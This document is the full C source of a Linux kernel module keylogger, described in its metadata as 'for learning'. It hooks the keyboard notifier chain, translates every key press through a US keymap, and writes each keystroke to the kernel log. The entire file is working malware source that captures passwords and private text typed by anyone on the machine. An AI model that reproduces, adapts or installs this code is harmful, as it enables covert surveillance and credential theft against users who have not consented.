#include <linux/init.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

// Module metadata
MODULE_AUTHOR("BlazedEngima");
MODULE_DESCRIPTION("Keylogger for learning");
MODULE_LICENSE("GPL");

#define BUFF_SIZE 12 // Encoded 'keycode shift' length for US keyboards

// Declarations
static int key_log_main(struct notifier_block *nblock, unsigned long code, void *_param);
static void keycode_to_string(char *buff, int keycode, int shift_mask);

// Keycode to Character mapping with shift 
static const char *us_keymap[][2] = {
  {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, {"3", "#"}, {"4", "$"}, {"5", "%"}, 
  {"6", "^"}, {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},
  {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
  {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},
  {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, {"'", "\""},
  {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, {"b","B"},
  {"n", "N"}, {"m", "M"}, {",", "<"}, {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
  {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"},
  {"F5", "F5"}, {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},
  {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},
  {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDWN_"}, {"_KPD0_", "_INS_"},
  {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},
  {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_KPDENTER_", "_KPDENTER_"},
  {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"}, {"_HOME_", "_HOME_"},
  {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"}, {"_DOWN_", "_DOWN_"},
  {"_PGDWN_", "_PGDWN_"}, {"_INS_", "_INS_"}, {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
  {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
};

// Function that converts keycode to string
void keycode_to_string(char *buff, int keycode, int shift_mask) {
  if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
    const char *key_pressed = (shift_mask == 1)
                                ? us_keymap[keycode][1]
                                : us_keymap[keycode][0];

    snprintf(buff, (size_t) BUFF_SIZE, "%s", key_pressed);
  }
}

// Custom init and exit methods
static struct notifier_block key_log = {
  .notifier_call = key_log_main,
};

int key_log_main(struct notifier_block *nblock, unsigned long code, void *_param) {
  char buff[BUFF_SIZE] = {0};
  struct keyboard_notifier_param *param = _param;

  if (!(param->down)) return NOTIFY_OK;

  keycode_to_string(buff, param->value, param->shift);

  if (strlen(buff) < 1) return NOTIFY_OK;

  printk(KERN_INFO "Keylog: %s", buff);
  
  return NOTIFY_OK;
}

static int __init custom_init(void) {
  register_keyboard_notifier(&key_log);
  printk(KERN_INFO "Keylogger loaded.\n");
  return 0;
}

static void __exit custom_exit(void) {
  unregister_keyboard_notifier(&key_log);
  printk(KERN_INFO "keylogger removed.\n");
}

module_init(custom_init);
module_exit(custom_exit);
